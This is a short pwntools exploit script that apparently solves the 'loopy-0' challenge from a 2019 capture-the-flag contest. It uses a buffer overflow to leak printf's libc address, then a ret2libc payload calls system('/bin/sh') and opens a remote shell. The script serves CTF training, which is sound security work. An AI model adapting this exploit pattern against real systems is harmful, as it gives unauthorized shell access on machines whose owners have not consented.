#!/usr/bin/env python2

from pwn import *

elf = ELF('./loopy-0')
libc = ELF('./libc-2.28.so')
p = remote('shell.2019.nactf.com', 31283)

printf = elf.plt['printf']
printf_got = elf.got['printf']
main = elf.symbols['main']

payload = 'A'*76
payload += p32(printf)
payload += p32(main)
payload += p32(printf_got)

p.sendlineafter('>', payload)

p.recvuntil(': ')
leak = u32(p.recvuntil('Type')[-24:-20])

libc.address = leak - libc.symbols['printf']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))

payload = 'A'*76
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendlineafter('>', payload)

p.interactive()
